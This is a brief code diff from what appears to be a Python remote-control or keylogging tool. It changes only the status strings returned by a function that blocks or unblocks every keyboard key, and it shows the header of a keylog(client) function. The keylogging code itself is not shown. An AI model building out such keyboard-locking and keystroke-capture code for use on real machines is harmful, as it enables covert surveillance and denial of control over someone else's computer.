@@ -50,11 +50,11 @@ def lock(islock):
     if islock == 0:
         for i in range(150):
             keyboard.block_key(i)
-        return "The keyboard is block", 1
+        return "lock keyboard is success", 1
     else:
         for i in range(150):
             keyboard.unblock_key(i)
-    return "The keyboard is unblock", 0
+    return "unlock keyboard is success", 0
 
 def keylog(client):
     global cont, flag, islock, ishook
